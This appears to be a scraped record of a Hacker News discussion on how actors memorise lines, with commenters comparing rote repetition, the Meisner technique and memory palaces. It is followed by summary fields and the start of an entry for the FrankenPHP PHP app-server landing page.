imbue the words with appropriate intent and emotion, which I did not achieve by rote, but in a way it was comforting to have those specific words to start with, rather than make up some of my own that might or might not actually convey the proper intent, and almost surely not nearly as well as a luminary like Arthur Miller. As I see it, it's those words that establish my character, not the other way around. I like how Patrick Stewart puts it [1], as \"dead letter perfect\", which is apparently the default expectation in British theatre more so than, say, film acting. [1] https://www.theguardian.com/stage/2007/jul/29/theatre2 reply ugh123 12 hours agoprevLoved this quote from Michael Caine >You must be able to stand there not thinking of that line. You take it off the other actorâ€™s face. Otherwise, for your next line, youâ€™re not listening and not free to respond naturally, to act spontaneously. reply dbish 11 hours agoparentI love his way of putting it. Memorizing lines as a kid for plays always felt easy but itâ€™s because of something like what he describes. My biggest play to memorize was as one of the leads of The Importance of Being Earnest in high school and a big part of knowing it end to end was how I memorize talks today, just repeating it until you become the part, and feel like you know â€œyour partâ€ not â€œthe linesâ€. Youâ€™re not regurgitating lines, youâ€™re stepping through and reacting based on a set of information to a point where you donâ€™t even feel like youâ€™re trying to react. This also helps a lot with improvising when things go wrong since youâ€™re just following the flow your character would with the stimuli, rather then having to step line by line through. The worst people to act alongside were the rote memorizers who would break that flow to go back to a line that was missed or just freeze. reply eszed 10 hours agorootparentYes, exactly! What's really exciting is that you will have trained yourself to think your way through the material in the same way that Wilde - or Shakespeare, or Beckett, or whoever - did. It's mind-expanding, in the best possible way. When I was in a classical piece I'd usually come off stage speaking iambics or couplets for a while, without ever meaning to. reply bloak 9 hours agoparentprevThat sounds great for the cinema: if it goes off the rails the director can let it run for a bit if it looks some great improv or else shout CUT if it doesn't. However, on the stage ... I'm not so sure ... your fellow actors might not be so flexible and you might need to help them. Also, stage drama doesn't necessarily aim for the kind of \"naturally\" that is expected in modern cinema: a lot of it is deliberately \"theatrical\" in one way of another. The audience can't see a slightly raised eyebrow so you can do some dramatic gesture with your arms for the audience while slightly raising your eyebrow to communicate something to your fellow actor. Perhaps. I don't have practical experience of this. I'm just speculating. I expect someone will tell me if I've got it all wrong. reply the_af 5 hours agorootparent> However, on the stage ... I'm not so sure ... your fellow actors might not be so flexible and you might need to help them. Isn't this why they do stage rehearsals? Not so much to memorize the lines, but to see how each plays off the other actors. And it is while rehearsing that they can detect that something \"isn't working\". To me, what Michael Caine is saying seems essential for the stage, even more so than for cinema. For cinema, you can reshoot if a line or interaction feels unnatural. For theater you don't have this luxury. If you are saying out loud \"memorized lines\" you're really not paying attention to the other actor. Some theater is deliberately \"artificial\", but a lot isn't. And they definitely want to play off what the other actors are saying, otherwise it feels mechanical... which is what happens in unprofessional or kids' plays, everyone is \"reciting\" and it doesn't feel like a real play! reply echelon 11 hours agoparentprevThe Meisner repetition technique is such a powerful method of teaching this. The technique has two or more actors repeating the same lines back and forth at each other, based on simple observation and repetition. But what's really being said and communicated is the subtext of how the actors sense and feel - not the words at all. Saying \"you're wearing a blue shirt\" might encode the thought \"I don't like the tone of your voice\" or \"you've got a nice smile.\" And the other actor is meant to read that off of you and respond in kind. reply crazygringo 5 hours agorootparentThe Meisner repetition technique, sure. (Although it just doesn't connect/resonate for a lot of actors.) But the Meisner technique also teaches you to learn your lines by rote, practicing them in a monotone, intentionally devoid of meaning (the opposite of what this article describes), under the theory that this will free you to add spontaneous emotion in the moment. Whereas in my experience that's a terrible approach. It makes it vastly harder to learn the material (as this article suggests), and then students tend to perform closer to a monotone because that's how they practiced it and built an unconscious habit of association -- or once they're able to bring emotion to it they forget their lines because the emotion was overwhelming and they don't have the lines \"in their bodies\" connected to the emotions that are going on, because they learned them by rote. As you can tell, I'm not generally a fan of the Meisner technique overall... reply MrVandemar 9 hours agorootparentprevThis sounds like the basis for the \"Baseline Test\" in Blade-Runner 2049. Fascinating write up here: https://www.denofgeek.com/movies/blade-runner-2049-how-a-key... reply noufalibrahim 11 hours agorootparentprevThis is very interesting. Some lines which I remember from movies, I rarely do so because of the words. It's almost always because of the way it was delivered and the emotion or \"vibe\" that it put out. reply eszed 10 hours agorootparentprevOh, God. I can't stand Meisner work! I had to do a fair bit of it in graduate school, and it never, ever clicked with me. I could see it working for other actors, so I don't discount it, but I find it tedious in the extreme. Can you tell me a bit more about what you get out of it? What's your internal experience of the repetition exercises? reply Keyframe 8 hours agorootparentI can't tell from that angle, but having directed quite a few actors over years, there's a big difference in actors who've went to the workshops and internalized the process. It just shows, for the better and you can spot them rather quickly. Namely, you can tell they (for the better part) react 'naturally' making the character far more believable. Take what you will from this, but that has been my experience. reply eszed 6 minutes agorootparentThat makes sense. Someone else down-thread says Meisner isn't something they'd use after the beginner stage. I think, by that point in my career, I'd internalized enough of those lessons in other ways that it was kinda pointless for me. If I were still teaching I might give it a go with a beginner class - though I doubt I could teach it with conviction, so I'd probably call in someone else for a day. Like I say, I've noticed the same thing you have, so there's clearly something there. I've just never \"got it\", so it kinda fascinates me. reply echelon 9 hours agorootparentprev> What's your internal experience of the repetition exercises? It's a lot like improv in that you establish an unspoken protocol for exchanging lots of side channel information. But unlike reading between the \"yes, and\" subtext to build a narrative world and rules, you're taking in raw, full sensory emotion in an intimate way by completely dropping your own filters. Brains melded, firewall open. You have to say what you see, what you understand, and what you feel. And you have to tell the truth and not lie to yourself and your partner. It's as uncomfortable as staring into their eyes, until it stops being uncomfortable. And you don't even have to be looking at one another. You can hear it in their breathing and the cracking of their voice. You know exactly how you feel about everything with exacting precision. You're uncomfortable and vulnerable and excited and anxious, and you let them know. Meisner removes all the social filters of the adult brain. All the platitudes and the scar tissue of decades of interacting with people in society. You stop judging and worrying and just say and do what you feel. And you hear it from them too, and you believe them because they're being honest with both you and themselves. You know if they're lying, because you've trained and can sense it. And you'll call them out on it. They'll do the same to you when you attempt to hide. They'll really dig in. Once you're under that spotlight, there is no hiding. You can go wherever you choose to go. It feels raw and weird and more intimate than being with a lover. With practice, \"you're wearing a blue shirt\" becomes \"I don't like how you look at him and smile, but when you look at me you frown\". And everyone cries and yells and things get thrown. On the spectrum of our robotic \"how are you? / I'm fine, and you?\" programming and a raw and intense fight with a lover, Meisner is the latter. Except you get to be that authentic for the entire range of human emotions: good, bad, happy, sad. A door to everything you could potentially feel. It's animalistic and completely cerebral. And it's real and you live it. Sometimes you come away shaking. reply eszed 8 hours agorootparentHuh! That's my experience of performing, for sure, but Meisner wasn't presented to me that way. One of the teachers of a workshop I was in had studied with Meisner, and had led (I think?) the London Meisner Institute, so I figured I was getting it straight. She approached repetition exercises more like intuitive textual analysis - finding the subtext, as you (or someone else) said up-thread. I've never had trouble supplying more subtext than anyone could ever want, so that bit didn't do anything much for me. Neither did the crying and the yelling. I did too, just so as not to be left out (crying and yelling is always good fun), but they all took it so damn seriously that I wasn't sure where the line was between useful work and self-indulgence. Oh, and also I think a professional actor ought to be able to drop in without having to drag someone else through ten minutes of repeating the first three words of their lines back and forth until the syllables are drained of all meaning. True story! I was as good a sport about it as I could be, but gosh... It was drizzling, and the lighting guy fucked off for tea, and I sure wished I could too. I know more direct ways to get students to drop their inhibitions and tune into each other than repetitions. (Oh, and the audience! Everything I've seen of Meisner neglects the audience, and I think being aware of them is really important for stage work. Camera, same, for screen acting.) Anyway, I'm sure I'm just missing something, and being grumpy. Like I say, I've seen positive results for some actors (though not the chick in the rain), so it's doing something, and I'm glad it works for you. reply crazygringo 5 hours agorootparentGood lord that sounds terrible. From my understanding, the repetition exercise has always been something taught to brand-new students in the first month of acting classes, to demonstrate the difference between reciting lines and saying things in a spontaneous, believable manner. As well as to teach what subtext is. The idea that anyone would be doing the repetition exercise after their first month of acting school baffles me. It's not a technique that was ever intended for, or should be used by, professional actors, as far as I've ever understood it. reply tapotatonumber9 6 hours agorootparentprevâ€œThese pretzels are making me thirsty!\" reply jjk166 4 hours agoprevAs someone who acts in their spare time, I think the article is missing three things. First, actors do actually have to mechanistically memorize their lines in addition to understanding them. There are plenty of instances where you need to recite a long string of words in precise order because that's what's in the script, not because there is some underlying logic that makes the word choice self-evident. While early in the rehearsal process it doesn't matter, in fact it's a good thing to play around with the script, by the end you need to have everything locked down. There is more to theater than just conveying a character's state of mind - people depend on spoken cues, particularly for blocking, and maintaining timing is critical. On the flipside of that, theater is inherently a variable thing. No two shows are going to be exactly the same. A prop may not function correctly, someone else may mess up a line, the audience may laugh more or less at a joke, etc. You need to be able to adapt in the moment, which means you can't simply remember your lines, you need to be present in the moment. That's the real reason you need to understand your lines. As an aside, it helps that the audience typically does not have the script memorized, so as long as things on stage are progressing naturally, mistakes tend to go unnoticed. Finally, I think people grossly overestimate the difficulty of memorizing text. We invented language long before writing, and it is extremely optimized for being easily remembered by illiterate peasants. Think about how many songs you know - there are probably hundreds if not thousands you could easily sing along to even if you haven't heard them in years. Think about how many movie quotes you can recall to interject a random pop culture reference into a conversation on the fly. Crack open a book you read 10 years ago to a random page and see how long it takes you to know exactly where in the story you are. You might mistake a word here and there, perhaps switch the order of some lines, but you'll remember the bulk of it without putting in any effort at all. Actors reread their scripts dozens of times, they put as great deal of effort into practice, and their success depends upon this effort, of course the end result will be more polished than baseline memory, but the difference isn't that big. reply tasty_freeze 4 hours agoparent> Think about how many songs you know - there are probably hundreds if not thousands you could easily sing along to even if you haven't heard them in years. If what you said was true, there would be no need for the lyrics display at karoke bars. Years ago (25?) there was a game where you'd draw a card and then have to sing part of that song (I forget the actual game as it was long ago, but that is close enough). Everyone was psyched and it seemed like it was going to be fun. Then we found out none of us actually remembered the lyrics -- we could get part of the chorus and that was it. No doubt there are people who are great at remembering lyrics, but I strongly suspect it is a small minority of people. I think people overestimate their recall ability because they are singing along to the song in their car (or wherever) and so if they have a moment's hesitation or any doubt, the song keeps going and they are quickly back on track. But without that unfailing guide, they'd quickly fall off the rails. I have that experience all the time as a musician of moderate ability in a moderate cover song band. Everyone has the experience of learning a new song, thinking \"I have this song wired -- I can play flawlessly along to the original\" but then the band gets together and tries the song for the first time and it quickly falls apart. Any little bit of hesitation or doubt quickly grows and infects the other players and soon people start arguing if the drums come in after the 2nd or 4th repetition of some phrase, etc, etc. reply jjk166 2 hours agorootparent> If what you said was true, there would be no need for the lyrics display at karoke bars. You misunderstand what I'm claiming. That is exactly the issue I was describing - you recall the bulk but you make small mistakes and the skill is in reducing the small mistakes and being able to power through them and get back on track when they do happen. Playing instruments in a band is so much worse, it's not enough to know how the song goes, you need to be in perfect sync with other people, and any mistake is highlighted by the discord. In acting, there isn't another person saying your lines at the same time as you, and mild variation in pacing, intonation, etc from one performance to the next is not only acceptable but desirable. By analogy, you know what the Eiffel Tower looks like, you could probably sketch it accurately enough that someone else would recognize it as the Eiffel Tower, and they would probably be unable to tell you exactly what errors are in your sketch, even though you almost certainly don't know the count, size, and position of every beam. reply PandaRider 9 hours agoprevAs a long-time Anki user (and memory enthusiast), I would like to offer some caveats for those transferring actors' memorization techniques to study techniques (programming languages, chemistry, math etc...) > This deep understanding of a script is achieved by actors asking goal-directed questions, such as â€œAm I angry with her when I say this?â€ 1. Do embed emotions. For example: Go's CamelCase for exporting variables implies capital letters want to be loud. 2. Do invoke experience. Don't merely read and write code, teach it and activate multiple sensory inputs and multiple contexts! > Deep, elaborative processing enhances understanding by relating something you are trying to learn to things you already known 3. Do chunk it. Instead of creating new standalone memories, chunk it with other programming languages' syntax. In summary, while engaging with the material is important, it is not sufficient for passive tasks (how many times have you read a book and forgotten the main points?). reply follower 3 hours agoprevThe following remark in the article reminded me of one of the points raised in a video[0] on the \"Answer in Progress\" YouTube channel: \"Deep understanding involves focusing your attention on the underlying meaning of an item or event, and each of us can use this strategy to enhance everyday retention.\" The AIP video is motivated by Sabrina's (video creator/presenter) frustration around having a memory that \"sucks\": \"I can't remember a lot of the things I have done. I can't remember a lot of the things I'm supposed to do...\" One of the points raised in the video was: \"The most important thing for memory when an event is happening is to pay attention to it.\" Which seems to be consistent with the view expressed in the article. If memory is a topic of interest to you, you might find the AIP video a worthwhile watch: After investigating memory related research and conversations with people who have memorization related experience (both theoretical and practical) an attempt to memorise & recite 3,141 digits of pi in front of a theatre audience is made... (And, even if it's not a topic of interest, Sabrina's approach to both research[1] and presentation generally makes the result both informative and entertaining.) ---- footnotes ---- [0] \"i memorized 3,141 digits of pi to prove a point\": https://www.youtube.com/embed/KAjkicwrD4I [1] As a university graduate with a focus in math, economics, & statistics, who often develops software tools during video creation process. reply dgan 10 hours agoprevMy random thoughts : human memory is more like linked lists, rather than hash tables At some point i was bored and wanted to learn by heart a pretty long poem (Lermontov, Demon). I was able to recite it for 15 min straight t normal talking speed, but if you d ask me to start in the middle, i wouldn't be able to. I had to come back to a known point, and go on from that reply Ekaros 10 hours agoparentRandom access is interesting. I have not used enough alphabet or months name to be able to place them right immediately. On other hand most numbers in 10x10 table come out straight or with pretty fast mental tricks. Or maybe some numeric things are just more memorable for me. reply LouisSayers 9 hours agoparentprevYou can get around this by creating memory palaces and breaking up the task into chunks and then inserting the chunks into places within your palace. Then you have direct access to the start of each chunk, so like a hash table of linked lists. reply bentcorner 5 hours agoparentprevThis is my exact experience with learning piano. I could autopilot through a song but if I thought too hard about where I was in the piece I would leave my flow and not be able to continue. reply pavel_lishin 8 hours agoparentprevTo throw another anecdote into the bucket, whenever I'm asked for the last four digits of my ssn or phone number, I have to mentally say the whole thing. reply throwup238 8 hours agorootparentI can remember the last four digits of either explicitly but I still say the whole thing back in my head as an error correction mechanism. Itâ€™s like being an LLM: once Iâ€™ve got the first three tokens, the rest just flows out but if I remember the last four on their own, thereâ€™s a much higher chance of making an error. reply ramenbytes 9 hours agoparentprevI can't find it right now, but there was a conference proceedings detailing efforts structuring human thought around cons cells. reply mcmoor 9 hours agoparentprevThis is also what I realized when memorizing Qur'an. It's really felt when there are some similar \"nodes\" that makes you confused on what should be the next node. Like if line 1, 16, 78 is almost the same, when you encounter one of them you'll be confused whether to continue to line 2, 17, or 79. reply n_plus_1_acc 8 hours agorootparentI also have problems continuing with the right verse after the chorus of pop songs. reply the_af 5 hours agoparentprevThis is my experience as well. I can memorize a long-ish text, in both English and Spanish, but I cannot start it from any random point. I must start from either the beginning or very precise \"known\" checkpoints. Human memory like a linked list! I like this analogy. reply d--b 7 hours agoprevThis reminds me of Borgesâ€™s short story Pierre Menard, author of the Quijote in which a 20th century author called Pierre Menard steps in the shoes of Cervantes so much so that he actually re-writes Don Quijote, line by line, not because he wants to copy it, but because it makes sense to him at the moment when he writes it. A bit difficult to explain but itâ€™s a must-read! https://en.m.wikipedia.org/wiki/Pierre_Menard,_Author_of_the... reply follower 2 hours agoparentWell, that seems intriguingly topical in the current era of LLMs & occurrences of their verbatim reproduction of training data... :) Perhaps it's not mindless reproduction of the training data, rather, entirely mindful reproduction... :D The Wikipedia page notes: \"Pierre Menard is often used to raise questions and discussion about the nature of authorship, appropriation, and interpretation.\" reply Tao3300 5 hours agoparentprev> Borges wrote the story while recovering from a head injury. It was intended as a test to discover whether his creativity had survived the severe septicaemia that had set in after his head wound became infected. I never knew that part. Adds a whole new dimension to the narrative when you think about it. reply wintercarver 9 hours agoprevIf you enjoyed this article Iâ€™d recommend checking out the book _Moonwalking with Einstein_ by Joshua Foer. Great read and fascinating dive into the lives and practices of individuals that participate in memory competitions. reply mariocesar 2 hours agoprevIt makes me remember Pedro Pascal and how he memorized scripts: https://people.com/pedro-pascal-reveals-tedious-way-he-memor... > \"You use the first letter of each word in these sort of towers, these columns I guess,\" he said. \"And then it's this very, very tedious way of making yourself learn the line.\" Reading the comments here on HN, I think it's safe to say that you need a combination of mechanical repeating and learning by heart. reply ajb 9 hours agoprevAt least some actors do do the initial memorization by repetition, which also tells us something about memory: the process is to try to recall lines 1-10, then repeat with lines 2-11, then 3-12 etc. At each step it may be necessary to look at a line but then hide it again before performing the act of recalling. This illustrates two things about memory: attempting to recall is the thing that causes you to remember, and also that to enter longer term memory is necessary to recall from that, rather than short term memory. Which the above process does by thrashing short term memory with too much data to fit. This doesn't get you to perfection, probably the process described in the article is necessary as there next step. reply asimpletune 10 hours agoprevSomeone recently told me that they couldn't remember and recite historical stuff because it wasn't like math, which they could reconstruct from first principles. I replied that if you can begin to understand something you can begin to remember it. reply eru 9 hours agoparentThe bar isn't even all that high: your brain just needs a plausible story, but it doesn't really need to 'understand' anything. So a complete bonkers 'understanding' of history might still be perfectly serviceable to help you memorise it. reply Paddywack 11 hours agoprevMmmm. I think I intuitively study like this, but I often have issues recalling the original word. For example - remembering â€œshyâ€ for the dwarf â€œBashfulâ€, my brain will cycle through heaps of synonyms trying to pick which one is right (while not not making a fool of myself). reply eszed 10 hours agoparentThose are the most revealing moments! When my brain goes to a synonym it tells me that I understand the scene, but not the character. There's something different about their perspective and mine: why did I think this, but they thought that? \"Mistakes\" like that are gifts. (This applies far beyond acting. Why did a co-worker explain a concept this way, instead of that? It'll tell you something about their thought process - and yours - if you give it some attention and some thought.) reply krisoft 4 hours agorootparent> When my brain goes to a synonym it tells me that I understand the scene, but not the character. That of course assumes that the script writer is infallible. Maybe you do understand the scene and the character deeply, and the writer screwed up by choosing the wrong synonym. reply Paddywack 10 hours agorootparentprevThanks - such an awesome perspective! Iâ€™ll pay more attention to the character and see how it goes! It will save a lot of internal frustration if I nail that! reply eszed 9 hours agorootparentIt goes as far as you want to take it, because every detail counts. I've done some long, long runs, and the ~300th performance is more interesting than the first. You get down to where you're working at the syllable level - noticing, for instance, that moving on this word, rather than that one changes the whole dynamic of the scene. You have to be blessed with a good script, and cast mates who'll follow you down the rabbit-hole, of course, but there's no bottom to it. It's endlessly interesting work, and deeply, deeply satisfying. reply follower 1 hour agorootparent> You get down to where you're working at the syllable level - noticing, for instance, that moving on this word, rather than that one changes the whole dynamic of the scene. That's an interesting perspective on performance for me as it parallels one of the aspects I enjoyed about performing stand-up comedy regularly for a time (primarily at open mics): getting to observe/analyse/theorize what contributed to whether a particular \"bit\" \"worked\" or not--both for myself and others. For my own performances, I could choose a different word, phrasing, tempo etc and see how/if that affected audience response. Equally, learning from observing the impact of when other performers did the same, refining their set over multiple weeks. And, then, also seeing how other factors we had less control over (you know, such as the audience :) ) had an impact: sometimes same line, same delivery, might kill one week but got crickets the next. Granted, my approach to comedy might lean a little more... analytical than some. :D reply coldpie 5 hours agorootparentprev> I've done some long, long runs, and the ~300th performance is more interesting than the first. Your description really meshes with my experience playing classical guitar. It takes a few months of work to memorize the piece, but then the fun begins. I've played the same piece hundreds of times. Instead of it getting boring, I keep noticing some new thing in the piece every week, it constantly feels \"new.\" Bring out the bass for these two beats on this measure; hold this melody note just a tad longer; the harmony in these two measures makes for a great descending line, make sure the notes connect. Stuff you don't notice on your first couple dozen plays, that endless repetition starts to bring out. It doesn't work for every piece, but for my favorites, it's really a bottomless hole, like you said. reply hyperthesis 9 hours agoparentprevI was curious: they all have two-syllable names except for Doc (leader). reply risfriend 4 hours agoprevSomehow reminded me of how Michael Scott remembers things: https://www.youtube.com/watch?v=FSi41cNvmXQ reply circlefavshape 8 hours agoprevInteresting - as a singer I always memorize words by ... well, just by memorization. When I've been in (amateur) theatre stuff I've always been struck by how much more difficult it is to learn words that don't rhyme, but it never occurred to me that there might be other techniques apart from plain old repetition reply _glass 11 hours agoprevWhen I was beginning acting, I was mostly afraid of this, memorizing the script. But then after getting experience from fellow actors and reading up on method, I realized how easy that part is. You anyway approach the script slowly, first maybe even using your own words. This way the words flow naturally later on. I was never afraid of the script, just about inauthentic acting, which really can happen. You have to deeply immerse yourself in the emotional world. reply akavel 5 hours agoprevOk, so this interestingly connects in my mind with how older religions see it as important to teach their holy texts by heart (e.g., Jews learning the Bible, or Muslims learning the Koran): this article's claim seems to support the idea, that it should lead to a better understanding of the meaning of, and behind, the text. reply ravirajx7 11 hours agoprevWow! Brilliant Read. I love how our mind loves to read and visualize scripts and it's like in between infinite thoughts going within. The time we repeat we think in some different way thinking \"Oh yeah! Now I understand this more\". Curious to know from the people who have read a lots and lots of text or books or watched movies. reply quartesixte 11 hours agoparentI have read a lot. And contemplative re-reading certain passages or re-watching scenes truly does activate further analysis. For your mind no longer has to decode the surface layer and then has time to search for other patterns. The more you read or watch the faster this becomes. The neat part is when you can do a double or even triple reading near instantaneously. Itâ€™s a little trickier for films, but still possible. I believe this is how your friends who are really good at just breaking down meaning on first watch are doing it â€”- they have gained media literacy skills that let them take in scenes in a blink of an eye. Practice your memory, and you can also hold past scenes in your head as new scenes come up. New connections made there too. Once I get started on a piece of fiction, I donâ€™t exactly see the text anymore either â€” my brain starts constructing a sort of movie/diorama in my head and every subsequent sentence builds it more and more. Makes reading fiction great and emotional/symbolic analysis great but funnily enough makes me a weak analyst of the language and craft itself. Made my years in undergrad ironically challenging. reply rapjr9 6 hours agoprevSo it seems like a corrollary of this would be that people do not remember what they do not understand and what they can not place in context, which could explain a lot of human behavior. If you do not understand something it mostly does not exist for you, you never remember it and never think about it. This is why complexity is used to hide and deceive. reply grondilu 11 hours agoprevMy experience with learning chess openings is comparable : repetition is necessary but not sufficient. You need to \"work\" on each line, thinking deeply about each one and trying to find associations either between them or with things you already know. reply phtrivier 8 hours agoprevAnecdotal: for the specific case of \"freshly written standup comedy routine\", mental palaces [1] have proven effective, at least for me. Once you remember that \"your next joke is about x,y,z\", it's pretty easy to remember the joke itself. [1] https://en.wikipedia.org/wiki/Method_of_loci reply follower 2 hours agoparentFortunately memorization isn't a requirement for stand-up or my stint performing it might've ended up even shorter than it already was. :D Like general public-speaking, approaches used by individuals to prepare/perform stand-up do seem to vary based on personal preference/comfort/style. (In a similar way I wasn't a fan of/good at \"rote memorization\" in my academic life either.) reply alimw 2 hours agoprevThe words \"cart\" and \"horse\" spring to mind, in that order. reply ggm 12 hours agoprevThe tl;Dr is they do it by a massive investment in time and brainpower, mechanistically or not. Michael Caine contextualises it as living inside the characters mind. We can recall bashful by context is true. The depth of context an actor has to carry is far beyond that, it seems to go to motivation, intent and meaning in deep ways. The trope of an actor asking the director \"what's my motivation\" when they're a redshirt and die in scene 2 may actually be .. true: everyone probably has to know why they say what they say to remember to say it well. reply 082349872349872 10 hours agoparentI once asked a director \"why do we spike the fine makeup station in three different fine places for the three backstage scenes?\" and she replied \"because the relationship between the younger actor and older actor changes between those scenes: in the first, the older is a mentor, and in the last, the younger has eclipsed him, so the angle of the station to the audience, literally upstaging the older actor, reflects his metaphorical upstaging during their careers.\" Not only did that make sense, but it's an example of even the scenery profiting from learning its motivation. reply eszed 9 hours agoparentprevIt's absolutely true, in the sense that everyone on stage / screen needs a strong internal logic for why they're doing what they're doing in order for that world to come to life. It's a basically satirical trope in the sense that only a bad and unprofessional actor would need to ask the director to tell them what it should be! Generally the translation goes the other way. The director gives a external-result oriented note (like, \"I need you to be more frantic, here\"), and then the actor comes up with the reason why that would be the case. reply austin-cheney 3 hours agoprevThe same strategy works for transforming a written essay into a memorized talk in front of an audience. reply WalterBright 10 hours agoprevOne glaring difference between acted speech and real speech is actors don't interrupt each other. Real conversations are often a bit of a mess. reply coldpie 5 hours agoparentOh MAN this is one of those things many script writers do (especially in video games) that drives me nuts. You can tell from the actor's line reading that the script read, \"Don't tell me what--\" to indicate that the speech was interrupted. But the actor reading the line just kind of awkwardly stops speaking after \"what,\" instead of continuing the line and actually being interrupted. It seems to me, not being a script writer, like an incredibly obvious thing to avoid doing. Like if it's this obvious to me, then everyone who touches that script should know not to do that. How did it make it through so many people (writer, VA director, actor) with no one saying anything about it? But it keeps happening, over and over, so there must be something in that writing & acting process that I'm not aware of. reply bigstrat2003 4 hours agorootparentI would imagine that in video games, it sounds so unnatural because the actors aren't actually performing together. The two people recorded those lines separately, so an interaction like that just isn't going to sound good. reply emmanueloga_ 9 hours agoparentprevSometimes they do! (to great effect). I feel a bunch of Woody Allen movies capture this (real conversations) pretty well. reply sethammons 9 hours agoprevTell a professional the goal, not prescribe the steps. It works for convincing dialogue between actors and effective product delivery from developers. You could stretch this to avoiding micromanaging. reply ape4 6 hours agoprevSomebody needs to write a play consisting of random words as a test of this ;) reply doctorhandshake 5 hours agoparentSomewhat related: there is an improvisation exercise in which two actors repeat one word only, back and forth, and follow the emotions they feel naturally. Frequently this results in what tonally sounds like a conversation, or an argument, etc., albeit free of semantic value. reply underlipton 1 hour agoprevOh, this is how you learn to draw. It's not copying or memorizing an arrangement of edges, it's learning how edges represent the shape, form, texture, and motion of an object. When you can draw something (particularly without reference), it's because you intrinsically understand that object's mass, volume, surface, and relation to other objects and its environment. reply nyc111 10 hours agoprevBut there is a huge difference between film acting and theatre acting. In film you just memorize your daily lines. What I find magical is how these actors go into character and deliver a line naturally for that character. I assume for serious work they practice with their own acting coach behind the scenes and then also practice during the shoot according to the directives of the director. Here Nuri Bilge Ceylan shows how to eat walnuts https://youtu.be/G6_pwltI85Q?si=2NXm1HP54YbAhepV It looks like the delivery of lines are the least important part. (In Turkish, but you'll get the gist of what he is saying.) reply golemotron 2 hours agoprevI wonder what the equivalent is for musicians who work without scores? Getting into the feel and emotional direction of the music you are playing? reply renewiltord 4 hours agoprevFunny. Perhaps thatâ€™s the only way to do it. At one point in my life, I was part of a theatre troupe playing small locations for obscure plays. On one occasion, there I was in the scene and my line coming up in 30 seconds. A twinge of fear as I realized I had no clue what to say. The fear rose steadily, culminating in abject terror till one of the other actors turned to me and cued me up - at which point it all just flowed. Awareness of self outside of what youâ€™re playing just destroys that flow state. Itâ€™s like that whether I think about the shuttle, the table tennis ball, or acting. reply breck 9 hours agoprev [â€“] Along similar lines, Louis CK said he does not write down his material (or at least, did not until recently). He explained that _knowing_ rather than _memorizing_ makes it come out more natural. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Actors remember their lines through elaborative rehearsal, which involves understanding the material's meaning and associating it with their character's motivations and emotions.",
      "Psychologists Helga and Tony Noice discovered that actors adopt their character's perspective and deeply analyze the script to recall lines naturally.",
      "This method, exemplified by actors like Michael Caine and John Basinger, emphasizes deep processing and meaningful associations, enhancing memory retention and applicable to everyday situations."
    ],
    "commentSummary": [
      "Actors use techniques like the Meisner Technique to foster genuine interaction and emotional authenticity, focusing on real-time responses rather than rote memorization.",
      "The discussion contrasts internal emotional acting with external projection, likening the latter to AI's unpredictability, and highlights themes from \"Her\" about AI's communication limits.",
      "Effective speakers and actors combine a deep understanding of material with engaging personas, while engineers excel in impromptu communication due to their deep understanding."
    ],
    "points": 417,
    "commentCount": 132,
    "retryCount": 0,
    "time": 1717046506
  },
  {
    "id": 40519722,
    "title": "FrankenPHP: A Modern PHP Server with Go, Caddy, and Cloud-Native Features",
    "originLink": "https://frankenphp.dev/",
    "originBody": "Ryan Weaver, long-time contributor to the PHP ecosystem, needs our help! Please consider making a donation now to support him. Donate SearchK Home Documentation Shop Need help? Powered by Change language cn fr tr Toggle navigation Home Documentation Shop Need help? Powered by Change language cn fr tr Toggle navigation The Modern PHP App Server, written in Go Get started # Docker docker run -v $PWD:/app/public -p 443:443 \\ dunglas/frankenphp # Static binary ./frankenphp php-server # Command-line script ./frankenphp php-cli /path/to/your/script.php One command to run them all Get started! Get a production-grade PHP server up and running in just one command! Ready for the future? Moderner PHP Than Ever! Uses the official PHP executor embedded in a state-of-the-art web server: Caddy Native support for HTTP/1.1, HTTP/2 and HTTP/3 Automatic HTTPS certificates generation and renewal (Letâ€™s Encrypt or ZeroSSL) Copy your PHP files in the document root, thatâ€™s all! Build standalone, self-executable and dependencies-free binaries for your PHP web applications, and command-line tools. Popular PHP extensions, including OPcache and XDebug, are natively supported! Try it Native support for Make your PHP apps faster than ever! Worker mode Worker script Boot your app once, it stays in memory! Straightforward Natively supported by Symfony, API Platform, Laravelâ€¦ Simple Uses plain old superglobals: no need for PSR-7. Fast According to our benchmarks, 3.5x faster than FPM on API Platform apps. Efficient FrankenPHP is written in Go and C. It relies on Goâ€™s iconic feature: goroutines! Optional Your app can be served as-is, even if it isnâ€™t compatible with the worker mode. Easy Deploy Runs in process: one binary, no external service needed. Fast as lightning So easy to configure! Five lines of config: itâ€™s now all you need to start a production-grade PHP server (automatic HTTPS, HTTP/3, Brotli compressionâ€¦), powered by Caddy. { # Enable FrankenPHP frankenphp order php_server before file_server } localhost { # Enable compression (optional) encode zstd br gzip # Execute PHP files in the current directory and serve assets php_server } Features FrankenPHP at a glance Extensible Compatible with PHP 8.2+, most PHP extensions and all Caddy modules. Only one service Designed with simplicity in mind: only one service, only one binary! FrankenPHP doesnâ€™t need PHP-FPM, it uses its own SAPI specially handcrafted for Go web servers. Easy deploy Cloud Native app shipped as a Docker image. Compatible with Kubernetes, and all modern cloud platforms. Itâ€™s also possible to package your PHP app as a standalone, self-executable static binary. Worker mode Boot your application once and keep it in memory! It is ready to handle incoming requests in a few milliseconds. 103 Early Hints Early Hints are a brand new feature of the web platform that can improve website load times by 30%. FrankenPHP is the only PHP SAPI with Early Hints support! Real-time Built-in Mercure hub. Send events from your PHP apps to all connected browsers, they instantly receive the payload as a JavaScript event! Brotli, Zstandard and Gzip compression Modern compression formats are supported out-of-the-box. Structured logging Bring a more defined format and details to your logging. Prometheus metrics and tracing Built-in Prometheus support! HTTP/2 & HTTP/3 Native support for HTTPS, HTTP/2 and HTTP/3. HTTPS Automation Automatic HTTPS certificate generation, renewal and revocation. Graceful reload Deploy your apps with zero downtime thanks to graceful reloads. Brought to you by KÃ©vin Dunglas, creator of API Platform and Symfony Core Team member. Design by Laury Sorriaux Sponsored by Les-Tilleuls.coop",
    "commentLink": "https://news.ycombinator.com/item?id=40519722",
